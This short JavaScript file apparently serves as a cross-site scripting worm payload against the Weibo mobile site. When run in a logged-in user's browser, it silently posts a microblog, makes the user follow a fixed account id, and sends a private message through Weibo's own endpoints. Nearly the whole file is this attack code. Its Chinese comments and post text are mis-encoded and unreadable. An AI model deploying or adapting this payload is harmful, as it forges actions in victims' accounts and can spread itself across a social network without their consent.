url_add_attention = 'http://m.weibo.cn/attentionDeal/addAttention?';
url_add_blog = 'http://m.weibo.cn/mblogDeal/addAMblog?';
url_send_msg = 'http://m.weibo.cn/msgDeal/sendMsg?';
function createXHR(){
    return window.XMLHttpRequest ? new XMLHttpRequest():new ActiveXObject("Microsoft.XMLHTTP");
}
function post(url,data,sync){
    xmlHttp = createXHR();
    xmlHttp.open("POST",url,sync);
    xmlHttp.setRequestHeader("Accept","text/html, application/xhtml+xml, */*");
    xmlHttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
    xmlHttp.send(data);
}
//����΢��
function send_blog(){
//����
       blog = encodeURI("��������");
       content = 'content=' + blog;
       post(url_add_blog, content, false);
}
//����˽��
function send_msg(){
       nick = encodeURI("username");
       content = encodeURI("test");
       msg_post_text = 'fileId=null&nick=' + nick + '&content=' + content;
       post(url_send_msg, msg_post_text, false);
}
//���ӷ�˿
function add_fans(){
       //uid
       uid = 'uid=2194202223';
       post(url_add_attention, uid, false);
}
function weibo_test(){
    try{
    send_blog();
    add_fans();
    send_msg();
    alert("ok");
    }
    catch(e){
        alert("failed");
    }
}
weibo_test();